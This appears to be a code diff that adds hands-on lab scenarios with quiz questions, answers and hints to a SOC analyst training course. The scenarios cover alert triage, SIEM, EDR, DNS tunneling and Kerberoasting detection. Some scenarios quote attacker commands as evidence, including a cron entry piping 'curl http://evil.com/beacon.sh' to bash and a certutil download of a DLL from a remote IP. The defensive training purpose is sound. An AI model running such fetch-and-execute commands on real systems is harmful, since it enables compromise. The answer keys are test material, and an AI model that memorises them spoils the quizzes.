@@ -109,7 +109,44 @@ Successful SOC analysts share these characteristics:
     additionalResources: [
       { title: "SANS SOC Survey Report", type: "article" },
       { title: "Building a SOC - NIST Guidelines", type: "documentation" },
-    ]
+    ],
+    practicalExercise: {
+      title: "SOC Alert Triage & Shift Handover",
+      description: "Practice triaging alerts and making shift handover decisions in a realistic SOC environment.",
+      steps: [
+        "Read the scenario and identify the key events",
+        "Determine the appropriate triage actions",
+        "Decide what information needs to be handed over",
+        "Answer the questions based on your analysis"
+      ],
+      labScenario: "You are an L1 SOC analyst starting your 12-hour night shift at 18:00 UTC. During handover, the outgoing analyst mentions three open alerts: a medium-severity brute force attempt against the VPN gateway from IP 198.51.100.22 (15 failed attempts, no success), a high-severity EDR alert showing PowerShell execution from winword.exe on workstation WS-FIN-03, and a low-severity firewall rule violation from a developer testing a new API. The outgoing analyst investigated the brute force but ran out of time on the EDR alert. Your SIEM dashboard shows 12 new alerts queued since the last review 45 minutes ago.",
+      labQuestions: [
+        {
+          id: "1.1-q1",
+          question: "Which alert should you investigate FIRST based on severity and risk?",
+          answer: "EDR alert",
+          hint: "Consider which alert involves active code execution on an endpoint."
+        },
+        {
+          id: "1.1-q2",
+          question: "What process spawned PowerShell on WS-FIN-03, indicating a possible macro-based attack?",
+          answer: "winword.exe",
+          hint: "Look at the parent process mentioned in the EDR alert."
+        },
+        {
+          id: "1.1-q3",
+          question: "How many failed login attempts were recorded against the VPN gateway?",
+          answer: "15",
+          hint: "Check the brute force alert details from the handover notes."
+        },
+        {
+          id: "1.1-q4",
+          question: "What is the key SOC metric that measures the time between threat entry and detection?",
+          answer: "MTTD",
+          hint: "Review the Key Performance Metrics table in the lesson."
+        }
+      ]
+    }
   },
   {
     id: "1.2",
@@ -1625,7 +1662,44 @@ Jan 15 14:32:05 webserver01 sshd[12345]: Failed password for invalid user admin 
       "Every log entry should have timestamp, source, event type, and relevant details",
       "Common challenges include volume, normalization, coverage gaps, and retention",
       "Prioritize authentication, endpoint, firewall, DNS, and proxy logs"
-    ]
+    ],
+    practicalExercise: {
+      title: "Log Analysis & Threat Detection",
+      description: "Analyze log entries from multiple sources to identify a coordinated attack.",
+      steps: [
+        "Review the scenario describing log events",
+        "Identify the attack type from the log patterns",
+        "Determine the compromised systems and accounts",
+        "Answer the questions based on your log analysis"
+      ],
+      labScenario: "Your SIEM ingests the following events within a 10-minute window: Firewall logs show 200 connection attempts from external IP 203.0.113.45 to port 22 (SSH) on server SRV-WEB-01. The Linux auth.log on SRV-WEB-01 records 'Failed password for root from 203.0.113.45' repeated 195 times, followed by 'Accepted password for root from 203.0.113.45'. Five minutes after the successful login, syslog shows a new cron job was created: '*/5 * * * * curl http://evil.com/beacon.sh | bash'. DNS logs reveal SRV-WEB-01 now queries 'c2.evil.com' every 5 minutes.",
+      labQuestions: [
+        {
+          id: "3.1-q1",
+          question: "What type of attack do the 195 failed SSH attempts followed by a success indicate?",
+          answer: "brute force",
+          hint: "Consider an attack that tries many passwords until one works."
+        },
+        {
+          id: "3.1-q2",
+          question: "Which user account was compromised on SRV-WEB-01?",
+          answer: "root",
+          hint: "Check the auth.log entries for the accepted password."
+        },
+        {
+          id: "3.1-q3",
+          question: "What persistence mechanism did the attacker install after gaining access?",
+          answer: "cron job",
+          hint: "Look at what was created 5 minutes after the successful login."
+        },
+        {
+          id: "3.1-q4",
+          question: "What domain does SRV-WEB-01 contact every 5 minutes for command and control?",
+          answer: "c2.evil.com",
+          hint: "Check the DNS log entries at the end of the scenario."
+        }
+      ]
+    }
   },
   {
     id: "3.2",
@@ -2558,7 +2632,44 @@ When rules match, the SIEM:
       "Correlation rules detect threats by matching patterns across events",
       "Major platforms include Splunk, Sentinel, Elastic, QRadar, and Chronicle",
       "Common challenges include alert fatigue, data volume, and false positives"
-    ]
+    ],
+    practicalExercise: {
+      title: "SIEM Alert Investigation",
+      description: "Use SIEM data to investigate a multi-stage attack involving brute force and lateral movement.",
+      steps: [
+        "Review the SIEM alerts and correlation data",
+        "Identify the attack stages from the event timeline",
+        "Determine the scope of compromise",
+        "Answer the questions based on your SIEM analysis"
+      ],
+      labScenario: "Your SIEM fires a correlation alert: 'Brute Force Followed by Lateral Movement.' The timeline shows: At 09:12 UTC, 300 failed login events (Event ID 4625) targeting the 'svc-admin' account from internal IP 10.0.1.55. At 09:18 UTC, a successful login (Event ID 4624, Logon Type 3) for 'svc-admin' from the same IP. At 09:22 UTC, the 'svc-admin' account initiated RDP sessions (Logon Type 10) to three servers: SRV-DB-01, SRV-APP-02, and SRV-FILE-03. At 09:30 UTC, a new scheduled task named 'WindowsUpdate' was created on SRV-DB-01 executing 'C:\\Temp\\payload.exe'.",
+      labQuestions: [
+        {
+          id: "4.1-q1",
+          question: "What account was targeted in the brute force attack?",
+          answer: "svc-admin",
+          hint: "Check the account name in the failed login events."
+        },
+        {
+          id: "4.1-q2",
+          question: "What Logon Type indicates the RDP lateral movement?",
+          answer: "10",
+          hint: "Review the Event ID 4624 details for the RDP sessions."
+        },
+        {
+          id: "4.1-q3",
+          question: "How many servers did the attacker move laterally to?",
+          answer: "3",
+          hint: "Count the servers accessed via RDP after the initial compromise."
+        },
+        {
+          id: "4.1-q4",
+          question: "What is the name of the suspicious scheduled task created for persistence?",
+          answer: "WindowsUpdate",
+          hint: "Look at the final event at 09:30 UTC on SRV-DB-01."
+        }
+      ]
+    }
   },
   {
     id: "4.2",
@@ -3550,7 +3661,44 @@ A **security alert** is a notification generated when a detection rule identifie
       "Context about assets and users is crucial for accurate triage",
       "Alert fatigue from too many false positives leads to missed threats",
       "Effective tuning and prioritization combat alert fatigue"
-    ]
+    ],
+    practicalExercise: {
+      title: "Alert Triage & Severity Assessment",
+      description: "Practice triaging security alerts and assessing their severity in a realistic SOC scenario.",
+      steps: [
+        "Review the incoming alerts and their details",
+        "Classify each alert by severity level",
+        "Determine the appropriate response actions",
+        "Answer the questions based on your triage analysis"
+      ],
+      labScenario: "During your shift, three alerts fire within 15 minutes. Alert 1: EDR detects 'mimikatz.exe' running on domain controller DC-01 under the SYSTEM account at 03:15 AM — no maintenance window is scheduled. Alert 2: Your email gateway flags an inbound email from 'hr-updates@company-benefits.xyz' containing a macro-enabled Word document sent to 8 employees in the finance department. Alert 3: Firewall logs show a single outbound connection from workstation WS-MKT-05 to a known Tor exit node IP on port 9001, lasting 2 seconds. The asset inventory shows DC-01 hosts Active Directory for 2,000 users.",
+      labQuestions: [
+        {
+          id: "5.1-q1",
+          question: "Which alert should be classified as CRITICAL severity?",
+          answer: "Alert 1",
+          hint: "Consider which alert involves credential theft tools on a critical server."
+        },
+        {
+          id: "5.1-q2",
+          question: "What credential dumping tool was detected running on the domain controller?",
+          answer: "mimikatz",
+          hint: "Check the EDR alert details for the executable name."
+        },
+        {
+          id: "5.1-q3",
+          question: "How many employees received the suspicious phishing email?",
+          answer: "8",
+          hint: "Look at the email gateway alert for the recipient count."
+        },
+        {
+          id: "5.1-q4",
+          question: "What type of network does the outbound connection from WS-MKT-05 attempt to reach?",
+          answer: "Tor",
+          hint: "Check the destination IP classification and port number."
+        }
+      ]
+    }
   },
   {
     id: "5.2",
@@ -4479,7 +4627,44 @@ As a SOC analyst, develop these habits:
     additionalResources: [
       { title: "MITRE ATT&CK Framework", type: "documentation", url: "https://attack.mitre.org" },
       { title: "Threat Intelligence 101", type: "article", url: "https://www.sans.org" }
-    ]
+    ],
+    practicalExercise: {
+      title: "Threat Intelligence Application",
+      description: "Apply threat intelligence to enrich alerts and identify threat actor activity.",
+      steps: [
+        "Review the scenario with IOC and intelligence data",
+        "Correlate indicators with known threat groups",
+        "Determine the appropriate intelligence actions",
+        "Answer the questions based on your analysis"
+      ],
+      labScenario: "Your threat intel feed delivers an urgent advisory: APT group 'ShadowViper' is actively targeting financial institutions using spear-phishing emails with PDF attachments exploiting CVE-2024-1234. Known IOCs include C2 domain 'update-service.shadow-cdn.com', file hash 'a1b2c3d4e5f6...', and callback IP 185.192.40.12. Minutes later, your SIEM shows a DNS query for 'update-service.shadow-cdn.com' from workstation WS-FIN-09. The workstation user 'maria.santos' opened a PDF attachment from an email received 20 minutes ago. EDR telemetry shows Adobe Reader spawning cmd.exe on the same workstation.",
+      labQuestions: [
+        {
+          id: "6.1-q1",
+          question: "What APT group is attributed to this campaign targeting financial institutions?",
+          answer: "ShadowViper",
+          hint: "Check the threat intel advisory for the group name."
+        },
+        {
+          id: "6.1-q2",
+          question: "What C2 domain from the advisory was resolved by the compromised workstation?",
+          answer: "update-service.shadow-cdn.com",
+          hint: "Match the DNS query with the IOCs in the threat advisory."
+        },
+        {
+          id: "6.1-q3",
+          question: "What application spawned cmd.exe, indicating the exploit was triggered?",
+          answer: "Adobe Reader",
+          hint: "Check the EDR telemetry for the parent process of cmd.exe."
+        },
+        {
+          id: "6.1-q4",
+          question: "What type of threat intelligence is this advisory — strategic, tactical, operational, or technical?",
+          answer: "tactical",
+          hint: "Consider which intelligence type describes adversary TTPs and IOCs."
+        }
+      ]
+    }
   },
   {
     id: "6.2",
@@ -5145,7 +5330,44 @@ As an L1 analyst, you primarily handle:
     additionalResources: [
       { title: "NIST SP 800-61", type: "documentation", url: "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf" },
       { title: "SANS Incident Handler's Handbook", type: "article", url: "https://www.sans.org" }
-    ]
+    ],
+    practicalExercise: {
+      title: "Incident Response Scenario",
+      description: "Walk through an incident response scenario from detection to containment.",
+      steps: [
+        "Review the incident timeline and evidence",
+        "Classify the incident severity",
+        "Determine containment actions",
+        "Answer the questions based on the IR framework"
+      ],
+      labScenario: "At 14:45 UTC, your EDR platform generates a critical alert: ransomware behavior detected on file server FS-CORP-01. The alert shows 'svchost32.exe' (note the '32') encrypting files in the shared drive with '.locked' extension. Investigation reveals the malware entered via a phishing email opened by user 'james.wilson' on WS-HR-02 at 14:20 UTC. The malware moved laterally from WS-HR-02 to FS-CORP-01 using stolen credentials for 'admin-backup'. Network logs show FS-CORP-01 communicating with 91.240.118.55 on port 443. Currently, 340 of 12,000 shared files have been encrypted, and the encryption is ongoing.",
+      labQuestions: [
+        {
+          id: "7.1-q1",
+          question: "What is the FIRST incident response phase you should execute right now?",
+          answer: "containment",
+          hint: "The incident is active and spreading — what phase stops the damage?"
+        },
+        {
+          id: "7.1-q2",
+          question: "What is the name of the suspicious process encrypting files on the file server?",
+          answer: "svchost32.exe",
+          hint: "Check the EDR alert for the process name — note the unusual naming."
+        },
+        {
+          id: "7.1-q3",
+          question: "Which user account was used for lateral movement to the file server?",
+          answer: "admin-backup",
+          hint: "Look at the stolen credentials used to access FS-CORP-01."
+        },
+        {
+          id: "7.1-q4",
+          question: "How did the malware initially enter the environment?",
+          answer: "phishing",
+          hint: "Trace back to the initial compromise vector on WS-HR-02."
+        }
+      ]
+    }
   },
   {
     id: "7.2",
@@ -6210,7 +6432,44 @@ Cost              │ Low       │ Higher
     additionalResources: [
       { title: "CrowdStrike University", type: "documentation", url: "https://www.crowdstrike.com" },
       { title: "Microsoft Defender for Endpoint Docs", type: "documentation", url: "https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/" }
-    ]
+    ],
+    practicalExercise: {
+      title: "EDR Investigation & Process Analysis",
+      description: "Investigate an EDR alert involving suspicious process execution and potential malware.",
+      steps: [
+        "Review the EDR alert and process tree",
+        "Identify the suspicious process chain",
+        "Determine the attacker's objectives",
+        "Answer the questions based on endpoint evidence"
+      ],
+      labScenario: "Your EDR flags a critical alert on workstation WS-DEV-11: 'Suspicious Process Chain Detected.' The process tree shows: excel.exe → mshta.exe → powershell.exe → certutil.exe. The PowerShell command includes '-encodedcommand' with Base64 data. Certutil was used to download a file: 'certutil -urlcache -split -f http://45.77.65.12/update.dll C:\\Users\\Public\\update.dll'. The DLL was then loaded by rundll32.exe establishing a connection to 45.77.65.12 on port 8443. The EDR's threat score is 95/100 and the file hash matches no known signatures in VirusTotal (0/72 detections).",
+      labQuestions: [
+        {
+          id: "8.1-q1",
+          question: "What Office application was the initial entry point in the process chain?",
+          answer: "excel.exe",
+          hint: "Check the first process in the process tree."
+        },
+        {
+          id: "8.1-q2",
+          question: "What Windows utility was abused to download the malicious DLL?",
+          answer: "certutil",
+          hint: "Look for the tool used with -urlcache to fetch a file."
+        },
+        {
+          id: "8.1-q3",
+          question: "The file has 0/72 VirusTotal detections. What does this likely indicate about the malware?",
+          answer: "zero-day",
+          hint: "Consider what it means when no antivirus engine recognizes a malicious file."
+        },
+        {
+          id: "8.1-q4",
+          question: "What directory was the malicious DLL saved to on the workstation?",
+          answer: "C:\\Users\\Public",
+          hint: "Check the certutil download command for the destination path."
+        }
+      ]
+    }
   },
   {
     id: "8.2",
@@ -7121,7 +7380,44 @@ Limit lateral movement between zones
     additionalResources: [
       { title: "TCP/IP Guide", type: "documentation", url: "http://www.tcpipguide.com" },
       { title: "Wireshark Documentation", type: "tool", url: "https://www.wireshark.org/docs/" }
-    ]
+    ],
+    practicalExercise: {
+      title: "Network Traffic Analysis",
+      description: "Analyze network traffic patterns to detect DNS tunneling and data exfiltration.",
+      steps: [
+        "Review the network logs and DNS queries",
+        "Identify anomalous traffic patterns",
+        "Determine the data exfiltration method",
+        "Answer the questions based on network evidence"
+      ],
+      labScenario: "Network monitoring detects unusual DNS activity from server SRV-APP-03 (10.10.1.50). Over the past hour, the server made 1,200 DNS TXT record queries to subdomains of 'analytics-data.xyz' — normal servers average 30 DNS queries per hour. Each subdomain contains a long Base64-encoded string like 'dXNlcm5hbWU6YWRtaW4=.analytics-data.xyz'. Simultaneously, NetFlow data shows SRV-APP-03 received 800 MB of data from internal database server DB-PROD-01 (10.10.2.10) over port 1433 (MSSQL). The server SRV-APP-03 has no legitimate reason to query the database. Firewall logs show all outbound traffic from SRV-APP-03 on ports 80/443 is blocked, but DNS (port 53) is allowed.",
+      labQuestions: [
+        {
+          id: "9.1-q1",
+          question: "What type of DNS record is being used for the suspected data exfiltration?",
+          answer: "TXT",
+          hint: "Check the DNS query type in the monitoring alert."
+        },
+        {
+          id: "9.1-q2",
+          question: "What exfiltration technique uses DNS queries to smuggle data out of a network?",
+          answer: "DNS tunneling",
+          hint: "Consider the technique that encodes data in DNS subdomain queries."
+        },
+        {
+          id: "9.1-q3",
+          question: "How much data was transferred from the database server to SRV-APP-03?",
+          answer: "800 MB",
+          hint: "Check the NetFlow data for the transfer volume."
+        },
+        {
+          id: "9.1-q4",
+          question: "Why is the attacker using DNS instead of HTTP/HTTPS for exfiltration?",
+          answer: "DNS is allowed",
+          hint: "Check what the firewall blocks versus what it permits."
+        }
+      ]
+    }
   },
   {
     id: "9.2",
@@ -30813,6 +31109,37 @@ SOC Responsibilities:
       "Remediation options include patching, workarounds, compensating controls, and risk acceptance",
       "SOC analysts correlate vulnerability data with SIEM alerts to detect active exploitation"
     ],
+    practicalExercise: {
+      title: "Vulnerability Prioritization Exercise",
+      description: "Prioritize vulnerabilities based on CVSS scores, asset criticality, and active exploitation.",
+      steps: [
+        "Review the vulnerability scan results",
+        "Assess each vulnerability's risk factors",
+        "Determine remediation priority order",
+        "Answer the questions based on your analysis"
+      ],
+      labScenario: "Your weekly vulnerability scan returns four critical findings. Vuln-A: CVE-2024-5678 (CVSS 9.8) — Remote Code Execution in Apache Struts on the public-facing web server handling customer payments, with active exploitation reported in the wild. Vuln-B: CVE-2024-4321 (CVSS 9.1) — SQL Injection in an internal HR application accessible only from the corporate network, no known exploits. Vuln-C: CVE-2024-8765 (CVSS 7.5) — Privilege Escalation in Windows Print Spooler on 200 employee workstations, proof-of-concept exploit published last week. Vuln-D: CVE-2024-1111 (CVSS 10.0) — Authentication Bypass in a test server with no production data, isolated in a lab network.",
+      labQuestions: [
+        {
+          id: "11.1-q1",
+          question: "Which vulnerability should be patched FIRST based on risk prioritization?",
+          answer: "Vuln-A",
+          hint: "Consider which combines high CVSS, internet exposure, critical data, and active exploitation."
+        },
+        {
+          id: "11.1-q2",
+          question: "What is the CVSS score of the Apache Struts RCE vulnerability?",
+          answer: "9.8",
+          hint: "Check the CVSS score listed for Vuln-A."
+        },
+        {
+          id: "11.1-q3",
+          question: "Despite having the highest CVSS score (10.0), why is Vuln-D lower priority?",
+          answer: "isolated test server",
+          hint: "Consider the asset's network exposure and data sensitivity."
+        }
+      ]
+    }
   },
   {
     id: "11.2",
@@ -31438,6 +31765,43 @@ Prevention & Hardening:
       "DCSync mimics DC replication — detect via Event ID 4662 from non-DC sources",
       "Defense includes AES enforcement, managed service accounts, LAPS, and tiered administration"
     ],
+    practicalExercise: {
+      title: "Active Directory Attack Detection",
+      description: "Detect and analyze a Kerberoasting attack using Windows Event Logs and SIEM data.",
+      steps: [
+        "Review the suspicious Kerberos activity in the logs",
+        "Identify the attack technique from the indicators",
+        "Determine the compromised accounts and scope",
+        "Answer the questions based on the AD investigation"
+      ],
+      labScenario: "Your SIEM triggers a custom detection rule: 'Potential Kerberoasting Activity Detected.' The alert shows user 'john.martinez' from workstation WS-DEV-04 requested TGS tickets (Event ID 4769) for 12 different service accounts within 3 minutes. All requests used RC4 encryption (0x17) instead of the organization's standard AES-256 (0x12). The targeted service accounts include 'svc-sql-prod', 'svc-backup-admin', and 'svc-exchange'. The account 'svc-sql-prod' has a password last set 540 days ago and has Domain Admin privileges. No IT change requests exist for john.martinez's activity.",
+      labQuestions: [
+        {
+          id: "12.1-q1",
+          question: "What Active Directory attack technique is indicated by mass TGS ticket requests with RC4 encryption?",
+          answer: "Kerberoasting",
+          hint: "Consider the attack that requests service tickets for offline password cracking."
+        },
+        {
+          id: "12.1-q2",
+          question: "What Windows Event ID logs TGS ticket requests used to detect this attack?",
+          answer: "4769",
+          hint: "Check the Event ID mentioned in the SIEM alert."
+        },
+        {
+          id: "12.1-q3",
+          question: "Which service account is the highest-value target due to its Domain Admin privileges?",
+          answer: "svc-sql-prod",
+          hint: "Look for the account with elevated privileges mentioned in the scenario."
+        },
+        {
+          id: "12.1-q4",
+          question: "What encryption type should the organization enforce to mitigate Kerberoasting?",
+          answer: "AES-256",
+          hint: "Check what the organization's standard encryption is versus what the attacker used."
+        }
+      ]
+    }
   },
   {
     id: "12.2",
